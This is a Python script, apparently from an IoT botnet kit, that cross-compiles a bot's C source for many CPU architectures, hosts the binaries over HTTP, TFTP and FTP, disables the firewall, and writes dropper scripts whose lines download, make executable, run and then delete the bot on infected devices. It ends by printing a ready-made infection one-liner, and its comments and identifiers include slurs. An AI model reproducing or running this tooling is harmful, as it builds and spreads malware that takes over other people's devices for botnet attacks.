#
#Usage: python ccedit.py [BOTNAME.C] [IPADDR]
#Skype: b1narythag0d
#XMPP: b1nary@nigge.rs
#Made Date: 7-19-16
#
#
#				*** DO NOT LEAK THIS SHIT ITS PRIVATE AF ***
#
# ___     __________  ____ _______      _____ _______________.___.  ___
# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\
# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/
#           |    |   \ |   /    |    \/    |    \    |   \\____   |
#           |______  / |___\____|__  /\____|__  /____|_  // ______|
#                  \/              \/         \/       \/ \/
#
#						*** ccedit.py ***
#

import subprocess, sys

print("\x1b[31mCreated By ~B1NARY~")
print("\x1b[31mSkype: b1narythag0d")
print("\x1b[31mXmpp: b1nary@nigge.rs")
print("\x1b[34mMade Date: 7-19-16")
print("\x1b[0;32mUsage: python ccedit.py [BOTNAME.C] [IPADDR]\x1b[0m")
print("\x1b[31m")

bot = sys.argv[1]
if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " [BOTNAME.C] [IPADDR] \x1b[0m")
    exit(1)
	
# *** DEFINES ***
def system(cmd):
    subprocess.call(cmd, shell=True)
	
compileas = [
    "jackmymips", #mips
	"jackmymips64", #mips64
    "jackmymipsel", #mipsel
	"jackmysh2eb", #sh2eb
	"jackmysh2elf", #sh2elf
    "jackmysh4", #sh4
    "jackmyx86", #x86_64
	"jackmyi486", #i486
    "jackmyi586", #i586
    "jackmyi686", #i686
    "jackmypowerpc", #ppc
    "jackmypowerpc440fp", #ppc-440fp
    "jackmym86k", #m68k
    "jackmysparc", #sparc
    "jackmyarmv4", #armv4l
	"jackmyarmv4tl", #armv4tl
    "jackmyarmv5", #armv5l
    "jackmyarmv6", #armv6l
	]

getarch = [
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-mips.tar.bz2', #mips
	'http://monstersecurity.xyz/cross-compilers/cross-compiler-mips64.tar.bz2', #mips64
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-mipsel.tar.bz2', #mipsel
	'http://monstersecurity.xyz/cross-compilers/cross-compiler-sh2eb.tar.gz', #sh2eb
	'http://monstersecurity.xyz/cross-compilers/cross-compiler-sh2elf.tar.bz2', #sh2elf
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-sh4.tar.bz2', #sh4
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-x86_64.tar.bz2', #x86_64
	'http://monstersecurity.xyz/cross-compilers/cross-compiler-i486.tar.bz2', #i486
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-i586.tar.bz2', #i586
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-i686.tar.bz2', #i686
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-powerpc.tar.bz2', #ppc
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-powerpc-440fp.tar.bz2', #ppc-440fp
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-m68k.tar.bz2', #m68k
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-sparc.tar.bz2', #sparc
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv4l.tar.bz2', #armv4l
	'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv4tl.tar.bz2', #armv4tl
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv5l.tar.bz2', #armv5l
    'http://monstersecurity.xyz/cross-compilers/cross-compiler-armv6l.tar.bz2', #armv6l
	]
	
ccs = [
    "cross-compiler-mips", #mips
	"cross-compiler-mips64", #mips64
    "cross-compiler-mipsel", #mipsel
	"cross-compiler-sh2eb", #sh2eb
	"cross-compiler-sh2elf", #sh2elf
    "cross-compiler-sh4", #sh4
    "cross-compiler-x86_64", #x86_64
	"cross-compiler-i486", #i486
    "cross-compiler-i586", #i586
    "cross-compiler-i686", #i686
    "cross-compiler-powerpc", #ppc
    "cross-compiler-powerpc-440fp", #ppc-440fp
    "cross-compiler-m68k", #m68k
    "cross-compiler-sparc", #sparc
    "cross-compiler-armv4l", #armv4l
    "cross-compiler-armv4tl", #armv4tl
    "cross-compiler-armv5l", #armv5l
    "cross-compiler-armv6l", #armv6l
	]
# *** UPDATE SERVER ***
update_server = raw_input("Update Server? Y/n: ")
if update_server.lower() == "y":
	print("Updating Server")
	system("yum update -y")

# *** DEPENDENCIES ***
depends = raw_input("Install Dependencies? Y/n: ")
if depends.lower() == "y":
    print("Installing Dependencies")
    system("yum install perl -y")
    system("yum install gcc -y")
    system("yum install gcc-c++ -y")
    system("yum install cpan -y")
    system("yum install httpd -y")
    system("yum install tftp -y")
    system("yum install screen -y")
    system("yum install nano -y")
    system("yum install unzip -y")
    system("yum install tar -y")
    system("yum install wget -y")
    system("yum install curl -y")
    system("yum install busybox -y")
    system("yum install python-paramiko -y")
    system("yum install nmap -y")
else:
    depends_install = False
	
# *** CROSS COMPILING ***
yourafag = raw_input("Download Cross Compilers? Y/n: ")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False
system("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")
if get_arch == True:
    system("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        system("wget " + arch + " --no-check-certificate >> /dev/null")
        system("tar -xvf *tar.bz2")
        system("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")
num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    system("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

# *** TFTP/HTTPD CONFIG ***
system("yum install httpd -y")
system("service httpd start")
system("yum install xinetd tftp tftp-server -y")
system("yum install vsftpd -y")
system("service vsftpd start")
system('''echo -e "# default: off
# description: The tftp server serves files using the trivial file transfer \
#       protocol.  The tftp protocol is often used to boot diskless \
#       workstations, download configuration files to network-aware printers, \
#       and to start the installation process for some operating systems.
service tftp
{
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd
        server_args             = -s -c /var/lib/tftpboot
        disable                 = no
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')
system("service xinetd start")
system('''echo -e "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
system("service vsftpd restart")

# *** GTOP ***
system('echo -e "#!/bin/bash" > /var/www/html/gtop.sh')
for i in compileas:
    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/gtop.sh')
	
# *** FTP ***
for i in compileas:
    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')

# *** TFTP1 ***
system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp1.sh')
system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp1.sh')
system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp1.sh')
for i in compileas:
    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
	
# *** TFTP2 ***
system('echo -e "#!/bin/bash" > /var/lib/tftpboot/tftp2.sh')
system('echo -e "ulimit -n 1024" >> /var/lib/tftpboot/tftp2.sh')
system('echo -e "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tftp2.sh')
for i in compileas:
    system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
for i in compileas:
    system("cp " + i + " /var/www/html")
    system("cp " + i + " /var/ftp")
    system("mv " + i + " /var/lib/tftpboot")

# *** RESTARTING SERVICES ***
print("Stopping Iptables")
system("service iptables stop")
system("chkconfig iptables off")
print("Restarting Xinetd")
system("service xinetd restart")
print("Restarting Httpd")
system("service httpd restart")

# *** CHANGING ULIMIT ****
print("Changing Ulimit")
system("ulimit -Hn 999999; ulimit -Sn 99999")
system("ulimit -u 999999;ulimit -n 999999")
system('echo -e "ulimit -n 99999" >> ~/.bashrc')
system("sysctl -w fs.file-max=999999 >/dev/null")
system('echo "#.bashrc">> .bashrc')
system('echo "#ulimit set">> .bashrc')
system('echo "ulimit -u 999999">> .bashrc')
system('echo "ulimit -n 999999">> .bashrc')

# *** CREDZ ***
system('echo -e "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://' + ip + '/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp ' + ip + ' -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g ' + ip + '; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *" >> /root/p2p/wget.txt')
print("\x1b[0;32mYour link: cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://" + ip + "/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\x1b[0m")
print
print("\x1b[0;32mRecoded By ~B1NARY~\x1b[0m")